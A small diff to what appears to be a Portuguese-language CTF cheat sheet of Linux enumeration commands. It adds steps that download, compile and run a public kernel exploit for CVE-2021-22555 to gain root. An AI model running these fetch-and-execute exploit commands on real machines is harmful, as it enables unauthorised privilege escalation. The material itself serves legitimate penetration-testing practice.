@@ -177,6 +177,11 @@ find / -type d -name ".*" -ls 2>/dev/null
 find / -name flag.txt 2>/dev/null
 grep -Rni 'HTB{' / 2>/dev/null
 
+# CVE-2021-22555 (Versões vulneráveis do kernel: 2.6 - 5.11)
+wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+gcc -m32 -static exploit.c -o exploit
+./exploit
+
 # Lista tarefas agendadas diárias
 ls -la /etc/cron.daily/
 
